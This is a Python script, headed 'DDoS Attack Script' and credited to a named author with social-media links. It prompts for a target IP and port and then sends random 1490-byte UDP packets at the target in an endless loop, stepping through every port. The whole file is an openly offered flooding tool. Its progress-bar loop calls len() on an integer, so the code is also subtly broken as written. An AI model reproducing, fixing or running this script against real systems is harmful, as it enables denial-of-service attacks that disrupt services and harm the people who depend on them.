import sys
import os
import time
import socket
import random
from datetime import datetime

# Code Time
now = datetime.now()
hour, minute, day, month, year = now.hour, now.minute, now.day, now.month, now.year

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Clear the screen
os.system("clear")

# Print header
print("DDoS Attack Script")
print("Author   : HA-MRX")
print("You Tube : https://www.youtube.com/channel/UCCgy7i_A5yhAEdY86rPOinA")
print("github   : https://github.com/Ha3MrX")
print("Facebook : https://www.facebook.com/muhamad.jabar222")
print()

# Get the target IP and port from the user
ip = input("IP Target : ")
port = int(input("Port       : "))

# Clear the screen
os.system("clear")
print("Attack Starting")

# Attack loop
for _ in range(5):
    time.sleep(5)
    print(f"[{'=' * (len(_) + 1)}{' ' * (4 - len(_))}] {_ * 25}%")

sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent += 1
    port += 1
    print(f"Sent {sent} packet to {ip} through port: {port}")
    if port == 65534:
        port = 1
